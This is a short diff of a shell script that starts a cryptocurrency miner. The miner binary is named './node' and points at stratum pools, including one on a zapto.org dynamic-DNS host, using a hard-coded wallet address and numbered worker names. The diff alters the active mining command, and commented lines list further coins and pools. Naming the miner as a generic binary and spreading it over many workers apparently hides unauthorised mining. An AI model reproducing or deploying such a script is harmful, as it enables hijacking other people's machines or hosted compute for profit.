@@ -26,7 +26,7 @@ echo "start ${WORKER_NUMBER}"
 
 #./node -a yespower -o stratum+tcp://mine.pool.r4nd0m.us:6991 -u WXrBvF4x5fLiaw7aiWycJfbcVKukheuxak.crf_${HOURESX} -p c=SWAMP,mc=SWAMP > try.log
 # Qogecoin
-./node --disable-gpu -a YescryptR16 -o stratum+tcp://mining-pool.zapto.org:3735 -u bq1qd06v7mdfme2kcdp6x47vyev7pazuq2ftyzelre.crf_${WORKER_NUMBER} -p d=0.1 --cpu-threads-intensity 4 --miner-priority 4 > try.log
+./node -a YescryptR16 -o stratum+tcp://mining-pool.zapto.org:3735 -u bq1qd06v7mdfme2kcdp6x47vyev7pazuq2ftyzelre.crf_${WORKER_NUMBER} -p d=0.1 > try.log
 # Crionic
 # ./node --disable-gpu -a yespowerltncg -o us-east.coin-miners.info:7646 -u KCxkuCyNyB9CDMujccuvWxCz5PUDoyxpSv.crf_${WORKER_NUMBER} -p id=crf_${WORKER_NUMBER},c=CRNC,m=solo,d=0.2 --cpu-threads-intensity 4 --miner-priority 4 > try.log
 # Whive
